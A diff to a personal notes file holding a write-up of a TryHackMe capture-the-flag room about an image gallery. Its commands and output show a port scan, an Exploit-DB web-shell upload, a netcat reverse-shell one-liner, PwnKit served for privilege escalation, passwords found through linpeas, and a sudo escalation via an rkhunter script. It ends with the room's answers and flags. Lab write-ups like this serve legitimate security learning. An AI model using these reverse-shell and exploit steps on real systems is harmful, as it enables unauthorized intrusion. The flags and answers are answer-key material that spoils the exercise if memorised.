@@ -4,8 +4,6 @@ Try to exploit our image gallery system
 
 ![111](https://tryhackme-images.s3.amazonaws.com/room-icons/c53a8eb73f24535345477fdf603fe1de.png)
 
-
-
 ### Deploy and get a Shell
 
 Our gallery is not very well secured.
@@ -24,7 +22,6 @@ https://gist.github.com/jesusgavancho/d0063a1de1a91839b79914e552cfc507
 | |/ / _` | | |
 |   < (_| | | |
 |_|\_\__,_|_|_|
-
 
 ┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
 └─$ rustscan -a 10.10.19.103 --ulimit 5500 -b 65535 -- -A
@@ -156,7 +153,6 @@ Shellcodes: No Results
 File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (816)
 Copied to: /home/kali/php-8.1.0-dev-backdoor-rce/50214.py
 
-
 ┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
 └─$ python3 50214.py   
 TARGET = http://10.10.19.103:8080
@@ -173,7 +169,6 @@ Username : admin
 shell uploading
 - OK -
 Shell URL : http://10.10.19.103/gallery/uploads/1671824700_TagokwdmwsifjbuowqbLetta.php?cmd=whoami
-
 
 url encode rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f (cyberchef)
 
@@ -264,7 +259,6 @@ zsh: suspended  rlwrap nc -lnvp 1337
 [1]  + continued  rlwrap nc -lnvp 1337
 www-data@gallery:/var/www/html/gallery/uploads$ reset
 
-
 www-data@gallery:/var/www/html/gallery/uploads$ mysql -u gallery_user -p
 mysql -u gallery_user -p
 Enter password: passw0rd321
@@ -335,7 +329,6 @@ PwnKit  PwnKit.c
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.19.103 - - [23/Dec/2022 15:09:22] "GET /PwnKit HTTP/1.1" 200 -
 
-
 www-data@gallery:/tmp$ mkdir witty
 mkdir witty
 www-data@gallery:/tmp$ cd witty
@@ -395,12 +388,10 @@ PwnKit  linpeas.sh
 www-data@gallery:/tmp/witty$ chmod +x linpeas.sh
 chmod +x linpeas.sh
 
-
 let's see
 
 www-data@gallery:/tmp/witty$ ./linpeas.sh
 ./linpeas.sh
-
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
@@ -484,7 +475,6 @@ Sudo version 1.8.21p2
 ./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
 ./linpeas.sh: 1197: ./linpeas.sh: 0: not found
 ./linpeas.sh: 1207: ./linpeas.sh: [[: not found
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                    
@@ -592,9 +582,6 @@ cat: write error: Broken pipe
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
 
-
-
-
 ╔══════════╣ Searching passwords in history files
       @stats   = stats                                                                                     
       @items   = { _seq_: 1  }
@@ -603,7 +590,6 @@ sudo -lb3stpassw0rdbr0xx
 sudo -l
 
 b3stpassw0rdbr0xx
-
 
 www-data@gallery:/tmp/witty$ cd /var/
 cd /var/
@@ -728,7 +714,6 @@ case $ans in
         exit;;
 esac
 
-
 Este código es un script de bash que permite a un usuario ejecutar distintas opciones utilizando el programa "rkhunter". "rkhunter" es una herramienta de seguridad que se utiliza para detectar posibles rootkits en sistemas basados en Unix.
 
 El script comienza leyendo una entrada del usuario a través de la instrucción "read". La entrada del usuario se almacena en la variable "ans". Luego, se utiliza la instrucción "case" para realizar una comparación entre la entrada del usuario y varias opciones predefinidas. Si la entrada del usuario coincide con una de las opciones, se ejecuta el código correspondiente. Las opciones disponibles son:
@@ -738,7 +723,6 @@ El script comienza leyendo una entrada del usuario a través de la instrucción 
 -   list: ejecuta el comando "rkhunter --list", que muestra una lista de todos los archivos verificados por "rkhunter".
 -   read: abre el archivo "report.txt" en el editor de texto "nano" y permite al usuario leerlo.
 -   *: si la entrada del usuario no coincide con ninguna de las opciones anteriores, se ejecuta la instrucción "exit", que finaliza el script.
-
 
 mike@gallery:~$ sudo /bin/bash sudo /bin/bash /opt/rootkit.sh
 sudo /bin/bash /opt/rootkit.sh
@@ -808,7 +792,6 @@ Perl module installation status:
     Socket                     Installed
     Carp                       Installed.
 
-
 mike@gallery:~$ sudo /bin/bash sudo /bin/bash /opt/rootkit.sh
 sudo /bin/bash /opt/rootkit.sh
 Would you like to versioncheck, update, list or read the report ? versioncheck
@@ -870,7 +853,6 @@ export SHELL=bash
 www-data@gallery:/var/www/html/gallery/uploads$ export TERM=xterm-256color
 export TERM=xterm-256color
 
-
 uhmm just using netcat without rlwrap . something fails when i open nano
 
 ──(kali㉿kali)-[~/Downloads]
@@ -920,24 +902,10 @@ THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
 
 :)
 
-
 ```
 
+  
 
-![[Pasted image 20221223142505.png]]
-
-  ![[Pasted image 20221223142802.png]]
-
-![[Pasted image 20221223152253.png]]
-
-![[Pasted image 20221223153303.png]]
-
-![[Pasted image 20221223160632.png]]
-
-![[Pasted image 20221223161124.png]]
-
-![[Pasted image 20221223161358.png]]
-![[Pasted image 20221223161443.png]]
 How many ports are open?
 
 *2*
@@ -960,6 +928,5 @@ What's the user flag?
 What's the root flag?
 
 *THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}*
-
 
 [[Agent T]]
